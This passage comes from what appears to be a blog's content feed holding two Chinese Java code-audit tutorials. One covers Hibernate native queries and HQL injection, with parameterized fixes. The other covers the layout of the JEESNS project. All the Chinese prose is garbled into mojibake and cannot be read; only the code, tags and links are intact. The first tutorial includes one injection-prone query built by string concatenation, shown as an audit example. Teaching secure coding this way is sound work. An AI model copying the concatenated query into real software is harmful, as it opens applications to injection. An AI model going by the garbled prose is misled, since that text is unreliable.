class="line"></span><br><span class="line"><span class="comment">//list æ˜¯æŸ¥è¯¢çš„ç»“æœï¼Œlisté‡Œçš„å…ƒç´ ç”±Objectæ•°ç»„æ„æˆ</span></span><br><span class="line"><span class="comment">//Objectæ•°ç»„çš„æ¯ä¸ªå…ƒç´ ä»£è¡¨ä¸€ä¸ªå­—æ®µï¼Œéœ€è¦å¼ºè½¬æ‰èƒ½ä½¿ç”¨</span></span><br><span class="line">Object[] record = (Object[]) list.get(<span class="number">0</span>);</span><br><span class="line">System.out.println(<span class="string">"id="</span>+(Integer) record[<span class="number">0</span>]+<span class="string">",name="</span>+(String) record[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒç§ï¼Œä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œ<code>Hibernate</code> ä¼šä½¿ç”¨ <code>ResultSetMetadata</code> è¿”å›çš„æ ‡é‡å€¼çš„å®é™…ç±»å‹ã€‚ä½†æ˜¯å¦‚æœè¿‡å¤šä½¿ç”¨å®ƒä¼šé™ä½ç¨‹åºæ€§èƒ½ï¼Œæ‰€ä»¥é€šå¸¸ä¼šç”¨ <code>addScalar()</code> æå‰æŒ‡å®šè¿”å›å€¼çš„ç±»å‹ã€‚ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">List list = session.createSQLQuery(<span class="string">"SELECT id,stu_name FROM student"</span>)</span><br><span class="line">                   .addScalar(<span class="string">"id"</span>, StandardBasicTypes.INTEGER)</span><br><span class="line">                   .addScalar(<span class="string">"stu_name"</span>, StandardBasicTypes.STRING)</span><br><span class="line">                   .list();</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰ç§ï¼Œä¸Šé¢çš„ä¸¤ä¸ªä¾‹å­ï¼Œè¿”å›çš„éƒ½æ˜¯æ ‡é‡ç»“æœé›†ï¼Œä½†æ˜¯ <code>Hibernate</code> æ˜¯ä¸€ä¸ª <code>ORM</code> æ¡†æ¶ï¼Œæˆ‘ä»¬å¸Œæœ›é€šè¿‡å®ƒï¼Œç›´æ¥å°†è¿”å›çš„æ•°æ®æ˜ å°„æˆå¯¹è±¡ã€‚é‚£æ€ä¹ˆå†™å‘¢ï¼Ÿå…¶å®ï¼Œå¾ˆç®€å•ã€‚åªè¦ä¸ºæ¯ä¸ªç±»å’Œè¡¨å†™ä¸€ä¸ªæ˜ å°„å…³ç³»ï¼Œè®© <code>Hibernate</code> çŸ¥é“è¯¥æ€ä¹ˆæŠŠæŸ¥åˆ°çš„æ•°æ®è½¬æ¢æˆå¯¹è±¡å°±è¡Œäº†ï¼ˆæ˜ å°„å…³ç³»æ˜¯å¦‚ä½•å†™çš„ï¼Œè¯·è‡ªè¡Œç™¾åº¦ï¼‰ã€‚ç„¶åï¼Œè°ƒç”¨ <code>addEntity()</code> å°†æŸ¥è¯¢ç»“æœå’Œç±»ç»‘å®šä¸€ä¸‹ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Student&gt; list = session.createSQLQuery(<span class="string">"SELECT * FROM student"</span>)</span><br><span class="line">                            .addEntity(Student.class)</span><br><span class="line">                            .list();</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Studentæ˜ å°„æ–‡ä»¶ --&gt;</span></span><br><span class="line">&lt;?xml version="1.0"?&gt;</span><br><span class="line"><span class="meta">&lt;!DOCTYPE hibernate-mapping PUBLIC</span></span><br><span class="line"><span class="meta">        "-//Hibernate/Hibernate Mapping DTD 3.0//EN"</span></span><br><span class="line"><span class="meta">        "http://www.hibernate.org/dtd/hibernate-mapping-3.0.dtd"&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">hibernate-mapping</span> <span class="attr">package</span>=<span class="string">"edu.cuit.syclover.hibernate.Student"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">class</span> <span class="attr">name</span>=<span class="string">"edu.cuit.syclover.hibernate.Student"</span> <span class="attr">table</span>=<span class="string">"student"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span> <span class="attr">name</span>=<span class="string">"id"</span> <span class="attr">column</span>=<span class="string">"id"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"stuId"</span> <span class="attr">column</span>=<span class="string">"stu_id"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"stuName"</span> <span class="attr">column</span>=<span class="string">"stu_name"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"stuPassword"</span> <span class="attr">column</span>=<span class="string">"stu_password"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">hibernate-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="HQL"><a href="#HQL" class="headerlink" title="HQL"></a>HQL</h2><p><code>HQL</code> æ˜¯ <code>Hibernate</code> ç‹¬æœ‰çš„é¢å‘å¯¹è±¡çš„æŸ¥è¯¢è¯­è¨€ï¼Œæ¥è¿‘ <code>SQL</code>ã€‚<code>Hibernate</code>å¼•æ“ä¼šå¯¹ <code>HQL</code> è¿›è¡Œè§£æï¼Œç¿»è¯‘æˆ <code>SQL</code>ï¼Œå†å°† <code>SQL</code> äº¤ç»™æ•°æ®åº“æ‰§è¡Œã€‚</p><p>å…³äº <code>HQL</code> çš„æ³¨å…¥ï¼Œé™åˆ¶å¾ˆå¤šã€‚</p><p><code>HQL</code> çš„é™åˆ¶å¦‚ä¸‹ï¼š</p><ol><li><p>ä¸èƒ½æŸ¥è¯¢æœªåšæ˜ å°„çš„è¡¨ï¼Œæ‰€ä»¥æƒ³è·¨åº“æŸ¥ç³»ç»Ÿè¡¨åŸºæœ¬æ²¡æœ‰å¸Œæœ›ã€‚</p><p> å¾ˆå¤šåœ°æ–¹è¯´ <code>HQL</code> ä¸æ”¯æŒ <code>UNION</code>ï¼Œå…¶å®æ˜¯é”™è¯¯çš„ã€‚<code>Hibernate</code> æ”¯æŒ <code>UNION</code> çš„ã€‚ä½†æ˜¯ï¼Œæƒ³è¦ä½¿ç”¨ <code>UNION</code>ï¼Œå¿…é¡»åœ¨æ¨¡å‹çš„å…³ç³»æ˜ç¡®åå¯ä»¥ï¼Œè¿™ç§æƒ…å†µæ¯”è¾ƒå°‘è§ï¼Œæ‰€ä»¥ä¼šå¯¼è‡´ <code>UNION</code> å¤±è´¥ã€‚</p></li><li><p>è¡¨åï¼Œåˆ—åå¤§å°å†™æ•æ„Ÿï¼ŒæŸ¥è¯¢æ—¶ä½¿ç”¨çš„åˆ—åå¤§å°å†™å¿…é¡»å’Œæ˜ å°„ç±»çš„å±æ€§ä¸€è‡´ã€‚</p></li><li><p>ä¸èƒ½ç”¨ <code>*</code>, <code>#</code> , <code>--</code></p></li><li><p>æ— å»¶æ—¶å‡½æ•°</p></li></ol><p>æ‰€ä»¥ï¼Œåˆ©ç”¨ <code>HQL</code> æ˜¯æ¯”è¾ƒæé™çš„ä¸€ä»¶äº‹æƒ…ã€‚</p><blockquote><p>æœ¬æ–‡ä¸è®¨è®ºå¦‚ä½• <code>HQL</code> æ³¨å…¥ï¼Œæƒ³äº†è§£æ›´å¤šçš„æ³¨å…¥æ‰‹æ³•ï¼Œå¯ä»¥çœ‹<a href="https://www.freebuf.com/articles/web/33954.html" target="_blank" rel="noopener">è¿™ç¯‡æ–‡ç« </a>ã€‚</p></blockquote><p><code>HQL</code> ä¼šå‡ºç°æ³¨å…¥çš„åœ°æ–¹è¿˜æ˜¯åœ¨å­—ç¬¦ä¸²æ‹¼æ¥çš„æ—¶å€™ï¼Œå®¡è®¡çš„æ—¶å€™çœ‹çœ‹ <code>SQL</code> æ˜¯ä¸æ˜¯ç”¨åŠ å· <code>+</code> çš„å°±è¡Œäº†ã€‚</p><p>æ¯”å¦‚è¿™ä¸ªä¾‹å­ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Student&gt; studentList = session.createQuery(<span class="string">"FROM Student s WHERE s.stuId = "</span> + stuId)</span><br><span class="line">                                   .list();</span><br></pre></td></tr></table></figure><p>ä¸‹é¢æ¥çœ‹çœ‹ <code>HQL</code> èƒ½é˜²æ³¨å…¥çš„å®‰å…¨å†™æ³•ã€‚</p><p>ç¬¬ä¸€ç§ï¼Œä½¿ç”¨å…·åå‚æ•° <code>Named parameter</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Student&gt; studentList = session.createQuery(<span class="string">"FROM Student s WHERE s.stuId = :stuId"</span>)</span><br><span class="line">                                   .setParameter(<span class="string">"stuId"</span>,stuId)</span><br><span class="line">                                   .list();</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒç§ï¼Œå ä½ç¬¦ <code>Positional parameter</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Student&gt; studentList = session.createQuery(<span class="string">"FROM Student s WHERE s.stuId = ?"</span>)</span><br><span class="line">                                   .setParameter(stuId)</span><br><span class="line">                                   .list()</span><br></pre></td></tr></table></figure><p>è¿™ä¸¤ç§å†™æ³•ï¼Œå’Œ <code>PreparesSatement</code> çš„åŸç†æ•ˆæœä¸€æ ·ï¼Œéƒ½æ˜¯ä»¥é¢„ç¼–è¯‘çš„æ–¹å¼ï¼Œé€šè¿‡å‚æ•°ç»‘å®šï¼Œå°†å‚æ•°å’Œ <code>SQL</code> åˆ†ç¦»ï¼Œä¿è¯ <code>SQL</code> ä¸è¢«æ±¡æŸ“ã€‚</p><h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><ul><li><p><a href="https://www.cnblogs.com/lcngu/p/5918363.html" target="_blank" rel="noopener">https://www.cnblogs.com/lcngu/p/5918363.html</a></p></li><li><p><a href="https://www.w3cschool.cn/hibernate_articles/gapw1ioo.html" target="_blank" rel="noopener">https://www.w3cschool.cn/hibernate_articles/gapw1ioo.html</a> </p></li><li><p><a href="https://www.freebuf.com/articles/web/33954.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/33954.html</a></p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ä»1å¼€å§‹çš„Javaä»£ç å®¡è®¡Â·ç¬¬äºŒå¼¹Â·åŸºç¡€ç¯‡ï¼ˆä¸‹ï¼‰</title>
      <link href="/2018/10/29/java-audit-step-by-step-2/"/>
      <url>/2018/10/29/java-audit-step-by-step-2/</url>
      
        <content type="html"><![CDATA[<p>æˆ‘ä»¬åœ¨å®¡è®¡ä¸€ä¸ªé¡¹ç›®çš„æ—¶å€™ï¼Œæœ€å¼€å§‹åº”è¯¥æ˜¯å…ˆç†Ÿæ‚‰é¡¹ç›®çš„ç»“æ„ï¼Œäº†è§£é¡¹ç›®çš„æŠ€æœ¯æ ˆã€‚</p><p>æœ¬ç¯‡ï¼Œæˆ‘ä¼šå¼•å…¥ä¸€ä¸ªå¼€æºçš„ Java Web é¡¹ç›®ï¼Œé€šè¿‡å®ä¾‹åˆ†æ Java Web çš„é¡¹ç›®ç»“æ„ï¼Œå¸¸ç”¨çš„ MVC æ¨¡å¼ã€‚</p><a id="more"></a><h1 id="JEESNS"><a href="#JEESNS" class="headerlink" title="JEESNS"></a>JEESNS</h1><p><a href="https://github.com/zchuanzhao/jeesns" target="_blank" rel="noopener">JEESNS</a>ï¼Œæ˜¯ä¸€æ¬¾åŸºäº JAVA ä¼ä¸šçº§å¹³å°ç ”å‘çš„ç¤¾äº¤ç®¡ç†ç³»ç»Ÿï¼Œåœ¨ github ä¸Šæœ‰ 200+ starï¼Œåœ¨å¼€æºçš„ Java Web é¡¹ç›®ä¸­ç®—æ˜¯è¿˜ä¸é”™çš„äº†ã€‚åœ¨æœ¬ç« åŠåé¢çš„å†…å®¹ï¼Œæˆ‘ä¼šç”¨å®ƒåšå®ä¾‹ï¼Œè¿›è¡Œå®¡è®¡åˆ†æã€‚</p><p>é¡¹ç›®åœ°å€ï¼š <a href="https://github.com/zchuanzhao/jeesns" target="_blank" rel="noopener">https://github.com/zchuanzhao/jeesns</a></p><h2 id="ä¸‹è½½é¡¹ç›®"><a href="#ä¸‹è½½é¡¹ç›®" class="headerlink" title="ä¸‹è½½é¡¹ç›®"></a>ä¸‹è½½é¡¹ç›®</h2><p>ä½ å¯ä»¥ç›´æ¥æŠŠé¡¹ç›® clone ä¸‹æ¥ï¼Œç„¶åå¯¼å…¥åˆ° IDEã€‚ä¹Ÿå¯ä»¥ç›´æ¥åœ¨ IDEA é‡ŒæŠŠé¡¹ç›®ä» VCSï¼ˆç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼‰ä¸­ checkout å‡ºæ¥ã€‚</p><p>ä¸‹é¢æˆ‘æ¼”ç¤ºä¸‹ï¼Œå¦‚ä½•åœ¨ IDEA é‡Œç›´æ¥ä» git æœåŠ¡å™¨ä¸Šè¿å‡ºé¡¹ç›®ã€‚</p><ol><li><p>æ‰“å¼€ IDEAï¼Œç‚¹<code>Check out from Version Control</code>ï¼Œé€‰æ‹©<code>Git</code>ã€‚<br><img src="/2018/10/29/java-audit-step-by-step-2/check1.png" alt="check1"></p></li><li><p>åœ¨å¼¹å‡ºçš„ dialog é‡Œï¼Œè¾“å…¥ git çš„åœ°å€(<a href="https://github.com/zchuanzhao/jeesns.git)ï¼Œä»¥åŠæœ¬åœ°ä¿å­˜çš„ä½ç½®ï¼Œç„¶å`clone`ã€‚" target="_blank" rel="noopener">https://github.com/zchuanzhao/jeesns.git)ï¼Œä»¥åŠæœ¬åœ°ä¿å­˜çš„ä½ç½®ï¼Œç„¶å`clone`ã€‚</a><br><img src="/2018/10/29/java-audit-step-by-step-2/check2.png" alt="check2"></p></li><li><p>ä¹‹åï¼ŒIDEA ä¼šå¼€å§‹ä¸‹è½½é¡¹ç›®ï¼Œå¹¶æ„å»ºï¼Œä¸‹é¢æ˜¯æ„å»ºå®Œæ¯•çš„é¡¹ç›®å·¥ç¨‹ã€‚<br><img src="/2018/10/29/java-audit-step-by-step-2/check3.png" alt="check3"></p></li></ol><hr><h1 id="é¡¹ç›®ç»“æ„è§£æ"><a href="#é¡¹ç›®ç»“æ„è§£æ" class="headerlink" title="é¡¹ç›®ç»“æ„è§£æ"></a>é¡¹ç›®ç»“æ„è§£æ</h1><h2 id="Maven"><a href="#Maven" class="headerlink" title="Maven"></a>Maven</h2><h3 id="æ ¹ç›®å½•ä¸‹çš„-pom-xml"><a href="#æ ¹ç›®å½•ä¸‹çš„-pom-xml" class="headerlink" title="æ ¹ç›®å½•ä¸‹çš„ pom.xml"></a>æ ¹ç›®å½•ä¸‹çš„ pom.xml</h3><p>åœ¨é¡¹ç›®çš„æ ¹ç›®å½•ä¸‹ï¼Œæœ‰ä¸€ä¸ª<code>pom.xml</code>çš„æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶çš„å­˜åœ¨ï¼Œè¡¨æ˜é¡¹ç›®æ˜¯ç”¨<code>Maven</code>æ„å»ºçš„ï¼Œ<a href="http://www.runoob.com/maven/maven-tutorial.html" target="_blank" rel="noopener">å…³äº Maven å¯ä»¥ç‚¹è¿™é‡Œ</a>ã€‚å®ƒæ˜¯ç”¨æ¥ç®¡ç†é¡¹ç›®æºç ã€é…ç½®æ–‡ä»¶ï¼Œä¸è¿‡æœ€å¤§çš„ç”¨å¤„è¿˜æ˜¯å¤„ç†<strong>é¡¹ç›®çš„ä¾èµ–å…³ç³»</strong>ã€‚ä½œç”¨æœ‰ç‚¹ç±»ä¼¼äº nodejs çš„ npmï¼Œpython çš„ pipã€‚</p><p>ä¸‹é¢ï¼Œç‚¹å¼€è¿™ä¸ª<code>pom.xml</code>ã€‚</p><p><img src="/2018/10/29/java-audit-step-by-step-2/maven1.png" alt="maven1"></p><p>çº¢æ¡†çš„ â‘  å¤„ï¼Œæè¿°äº†è¿™ä¸ªé¡¹ç›®çš„å¼€å‘ç»„ç»‡ï¼Œé¡¹ç›®åç§°ï¼Œé¡¹ç›®ç‰ˆæœ¬ã€‚</p><p>â‘¡ å¤„ï¼Œç”¨çš„æ˜¯<code>modules</code>æ ‡ç­¾ï¼Œè¯´æ˜è¿™æ˜¯ä¸€ä¸ªå¤šæ¨¡å—é¡¹ç›®ã€‚åœ¨å·¦è¾¹çš„å¯¼èˆªæ ï¼Œå¯ä»¥çœ‹åˆ°ç¡®å®æœ‰è®¸å¤šå­æ¨¡å—ã€‚</p><blockquote><p>å¤šæ¨¡å—é¡¹ç›®æ˜¯ä¸ºäº†åœ¨é¡¹ç›®å¼€å‘ä¸­ä¾¿äºåæœŸç»´æŠ¤ï¼Œæ‰€ä»¥é‡‡ç”¨åˆ†å±‚å¼€å‘çš„æ–¹æ³•ï¼Œè¿™æ ·å„ä¸ªæ¨¡å—çš„èŒè´£ä¼šæ¯”è¾ƒçš„æ˜ç¡®ï¼Œç»´æŠ¤èµ·æ¥ç›¸å¯¹å®¹æ˜“ã€‚åœ¨æ‰“åŒ…æ—¶ï¼Œåªè¦å¯¹çˆ¶æ¨¡å—æ‰“åŒ…å³å¯ï¼Œå­æ¨¡å—ä¼šè‡ªåŠ¨åˆå¹¶è¿›æ¥ã€‚</p></blockquote><p>â‘¢ å¤„ï¼Œæ˜¯ maven åœ¨æ„å»ºæ—¶ç›¸å…³çš„é…ç½®ï¼Œè¿™é‡Œç”¨äº†ä¸€ä¸ª compiler æ’ä»¶ï¼Œè¡¨ç¤ºæºç ç”¨çš„æ˜¯<code>1.7</code>çš„<code>JDK</code>å¹¶ä¸”ç”Ÿæˆçš„ç›®æ ‡å­—èŠ‚ç æ–‡ä»¶ä¹Ÿè¦æ˜¯<code>1.7</code>çš„ã€‚</p><h3 id="å­æ¨¡å—ä¸‹çš„-pom-xml"><a href="#å­æ¨¡å—ä¸‹çš„-pom-xml" class="headerlink" title="å­æ¨¡å—ä¸‹çš„ pom.xml"></a>å­æ¨¡å—ä¸‹çš„ pom.xml</h3><p>ç‚¹å¼€æ¯ä¸ªå­æ¨¡å—ï¼Œçœ‹åˆ°æ¯ä¸ªæ¨¡å—ä¸‹è¿˜ä¼šæœ‰ä¸€ä¸ª<code>pom.xml</code>ã€‚</p><p><img src="/2018/10/29/java-audit-step-by-step-2/maven2.png" alt="maven2"></p><p>éšä¾¿ç‚¹ä¸€ä¸ª<code>pom.xml</code>ï¼Œå®ƒå’Œæ ¹ç›®å½•ä¸‹çš„<code>pom.xml</code>æœ‰æ‰€ä¸åŒï¼Œå¤šäº†ä¸€ä¸ª<code>&lt;parent&gt;</code>æ ‡ç­¾ï¼Œå’Œ<code>dependencies</code>ã€‚</p><p><code>&lt;parent&gt;</code>æ ‡ç­¾ï¼Œè¡¨ç¤ºè¿™ä¸ªå­æ¨¡å—ï¼Œå°†ä¸Šçº§çš„<code>jeesns</code>é¡¹ç›®ä½œçˆ¶æ¨¡å—ã€‚</p><p><code>dependencies</code>ï¼Œæè¿°äº†è¿™ä¸ªæ¨¡å—çš„ä¾èµ–å…³ç³»ã€‚å½“å‰çš„<code>web</code>æ¨¡å—ä¾èµ–äºå­æ¨¡å—<code>core</code>,<code>model</code>,<code>service</code>,<code>common</code>ã€‚è€Œå­æ¨¡å—<code>core</code>é‡Œï¼Œä¾èµ–äºè®¸å¤šçš„ç¬¬ä¸‰æ–¹åº“ï¼ŒåŒ…æ‹¬<code>Spring</code>ã€<code>MyBatis</code>ã€<code>apache-commons</code>ç­‰ã€‚å®ƒä»¬éƒ½ç»§æ‰¿äº†ä¸Šçº§çš„<code>jeesns</code>çˆ¶æ¨¡å—ï¼Œåœ¨é€»è¾‘ä¸ŠåŒå±ä¸€ä¸ªé¡¹ç›®ã€‚</p><blockquote><p>ç›¸å…³æ–‡ç«  <a href="https://www.cnblogs.com/davenkin/p/advanced-maven-multi-module-vs-inheritance.html" target="_blank" rel="noopener">https://www.cnblogs.com/davenkin/p/advanced-maven-multi-module-vs-inheritance.html</a></p></blockquote><h2 id="ç¬¬ä¸‰æ–¹åº“çš„å®‰å…¨æ£€æŸ¥"><a href="#ç¬¬ä¸‰æ–¹åº“çš„å®‰å…¨æ£€æŸ¥" class="headerlink" title="ç¬¬ä¸‰æ–¹åº“çš„å®‰å…¨æ£€æŸ¥"></a>ç¬¬ä¸‰æ–¹åº“çš„å®‰å…¨æ£€æŸ¥</h2><p>å‰é¢æœ‰è¯´è¿‡ï¼Œ<code>pom.xml</code>æœ‰ä¸ªé‡è¦çš„ä½œç”¨æ˜¯ç®¡ç†ä¾èµ–å…³ç³»ã€‚åœ¨<code>&lt;dependencies&gt;</code>ä¸­å¡«å†™è¦å¼•å…¥çš„ç¬¬ä¸‰æ–¹åº“ä¿¡æ¯ï¼Œ<code>Maven</code>åœ¨<code>import</code>æ—¶ï¼Œä¼šä»<code>ä»“åº“</code>ä¸‹è½½ç›¸å…³çš„åº“æ–‡ä»¶ï¼ŒåŠ å…¥åˆ°å½“å‰é¡¹ç›®ã€‚</p><p>æˆ‘ä»¬éœ€è¦<code>&lt;dependencies&gt;</code>ä¸­ï¼Œæ£€æŸ¥ä½¿ç”¨çš„ç¬¬ä¸‰æ–¹åº“æ˜¯å¦æœ‰å·²çŸ¥çš„å®‰å…¨æ¼æ´ã€‚<br>è¿™é‡Œåªè¦æ ¹æ®ç»„ä»¶åç§°ã€ç‰ˆæœ¬å·ï¼Œå»å®˜ç½‘æˆ–è€…<code>CVE</code>æ¼æ´åº“æœä¸‹å°±è¡Œäº†ã€‚å¦‚æœé¡¹ç›®å¾ˆå¤§ï¼Œå¼•å…¥äº†å¤ªå¤šåº“ï¼Œè¿™ä¹Ÿæ˜¯ä»¶å¾ˆç´¯çš„äº‹æƒ…ã€‚</p><p>æ‰€ä»¥ OWASP å‡ºäº†ä¸€ä¸ªå·¥å…· <a href="https://www.owasp.org/index.php/OWASP_Dependency_Check" target="_blank" rel="noopener"><code>Dependency_Check</code></a> ä¸“é—¨æ£€æŸ¥è¿™ç±»é—®é¢˜ï¼Œè¿™ä¸ªå·¥å…·çš„ä½¿ç”¨åœ¨å‰é¢ä¸€ç¯‡å·²ç»è®²è¿‡äº†ï¼Œå°±ä¸å¤šä»‹ç»äº†ã€‚</p><h2 id="å­æ¨¡å—"><a href="#å­æ¨¡å—" class="headerlink" title="å­æ¨¡å—"></a>å­æ¨¡å—</h2><p><code>JEESNS</code> ä¸€å…±åˆ†äº†å…­ä¸ªå­æ¨¡å—ï¼Œåˆ†åˆ«æ˜¯ <code>jeesns-common</code>ã€<code>jeesns-core</code>ã€<code>jeesns-dao</code>ã€<code>jeesns-model</code>ã€<code>jeesns-service</code>ã€<code>jeesns-web</code>ã€‚</p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æ¥åˆ†æå„ä¸ªå­æ¨¡å—çš„ä½œç”¨ã€‚</p><h3 id="jeesns-core"><a href="#jeesns-core" class="headerlink" title="jeesns-core"></a>jeesns-core</h3><p>çœ‹åå­—å°±çŸ¥é“ï¼Œè¿™æ˜¯è¿™å¥— Web ç¨‹åºçš„æ ¸å¿ƒéƒ¨åˆ†ã€‚</p><p>é€šè¿‡åˆ†æ <code>pom.xml</code> æ–‡ä»¶ï¼Œå‘ç°å®ƒå¼•å…¥äº†ä»¥ä¸‹ç¬¬ä¸‰æ–¹åº“ï¼š</p><table><thead><tr><th>åº“å</th><th>ç”¨é€”</th></tr></thead><tbody><tr><td>spring-*</td><td>spring æ¡†æ¶ç›¸å…³</td></tr><tr><td>freemarker</td><td>å‰ç«¯æ¨¡æ¿å¼•æ“</td></tr><tr><td>httpclient</td><td>http å®¢æˆ·ç«¯</td></tr><tr><td>mysql-connector</td><td>mysql è¿æ¥å™¨é©±åŠ¨</td></tr><tr><td>c3p0</td><td>æ•°æ®åº“è¿æ¥æ± </td></tr><tr><td>mybatis</td><td>åŠè‡ªåŠ¨ ORM æ¡†æ¶</td></tr><tr><td>hibernate-validator</td><td>æ•°æ®æœ‰æ•ˆæ€§éªŒè¯</td></tr><tr><td>jackson</td><td>json æ•°æ®å¤„ç†åº“</td></tr><tr><td>jsoup</td><td>html è§£æå™¨</td></tr><tr><td>log4j</td><td>æ—¥å¿—ç®¡ç†æ¡†æ¶</td></tr><tr><td>commons-io</td><td>io å·¥å…·ç±»</td></tr><tr><td>commons-codec</td><td>ç¼–ç å¤„ç†å·¥å…·ç±»</td></tr><tr><td>commons-lang</td><td>Java åŸºæœ¬å¯¹è±¡å·¥å…·ç±»</td></tr><tr><td>commons-fileupload</td><td>æä¾›æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½</td></tr><tr><td>commons-logging</td><td>æä¾› Java æ—¥å¿—æ¥å£</td></tr></tbody></table><p>æ ¹æ®ä¸Šè¡¨ï¼Œå³ä½¿æˆ‘ä»¬ä¸çœ‹å®˜æ–¹çš„ä»‹ç»ï¼Œä¹ŸåŸºæœ¬å¯ä»¥ç¡®å®šè¿™å¥—ç¨‹åºçš„æŠ€æœ¯æ ˆã€‚</p><p>ä¸»è¦ä½¿ç”¨äº† <code>SSMæ¡†æ¶</code> (Spring+SpringMVC+MyBatis)ï¼Œ <code>freemarker</code> æ¨¡æ¿å¼•æ“ï¼Œæ”¯æŒ <code>MySQL</code> æ•°æ®åº“ï¼Œä½¿ç”¨ <code>c3p0</code> è¿æ¥æ± ï¼Œ<code>jackson</code> å¤„ç† <code>json</code> æ•°æ®ï¼Œ<code>hibernate-validator</code> å¯¹ç”¨æˆ·ä¼ æ¥çš„è¯·æ±‚æ•°æ®è¿›è¡Œæœ‰æ•ˆæ€§éªŒè¯ï¼Œè¿˜æœ‰ä¸€äº› <code>apache</code> æä¾›çš„å·¥å…·ç±»ã€‚</p><h4 id="åŒ…ç»“æ„"><a href="#åŒ…ç»“æ„" class="headerlink" title="åŒ…ç»“æ„"></a>åŒ…ç»“æ„</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">- core</span><br><span class="line"></span><br><span class="line">  - annotation å®šä¹‰æ³¨è§£</span><br><span class="line"></span><br><span class="line">  - consts å®šä¹‰å¸¸é‡</span><br><span class="line"></span><br><span class="line">  - directive å®šä¹‰äº†ä¸€ä¸ªæŠ½è±¡ç±» `BaseDirective` ï¼Œæ‰€æœ‰çš„æ ‡ç­¾ç±»éƒ½ä¼šç»§æ‰¿å®ƒ</span><br><span class="line"></span><br><span class="line">  - dto å®šä¹‰`å“åº”ç»“æœ`çš„æ•°æ®ä¼ è¾“æ¨¡å‹</span><br><span class="line"></span><br><span class="line">  - enums å®šä¹‰åŠŸèƒ½ç›¸å…³çš„å¸¸é‡</span><br><span class="line"></span><br><span class="line">  - exception å®šä¹‰å¼‚å¸¸</span><br><span class="line"></span><br><span class="line">  - filter å®šä¹‰è¿‡æ»¤å™¨ï¼Œç›®å‰åªæœ‰ä¸€ä¸ª`XSS`è¿‡æ»¤å™¨</span><br><span class="line"></span><br><span class="line">  - handler å®šä¹‰å¤„ç†å™¨ï¼Œç›®å‰åªæœ‰`DirectiveHandler`ï¼Œè´Ÿè´£å¤„ç†æ¯ä¸ªé¡µé¢çš„æ¸²æŸ“</span><br><span class="line"></span><br><span class="line">  - model å®šä¹‰äº†æ•°æ®æ¨¡å‹ï¼Œè¿™é‡Œåªæœ‰`Page`ï¼Œæè¿°é¡µé¢å¯¹è±¡ï¼Œç”¨äºæ•°æ®åˆ†é¡µæƒ…å†µ</span><br><span class="line"></span><br><span class="line">  - utils å®šä¹‰å·¥å…·ç±»</span><br><span class="line"></span><br><span class="line">+ interceptor</span><br><span class="line"></span><br><span class="line">  - PageInterceptor åˆ†é¡µæ‹¦æˆªå™¨ï¼Œå¤„ç†éœ€è¦åˆ†é¡µçš„è¯·æ±‚ã€‚</span><br></pre></td></tr></table></figure><h4 id="æ¨¡å—å°ç»“"><a href="#æ¨¡å—å°ç»“" 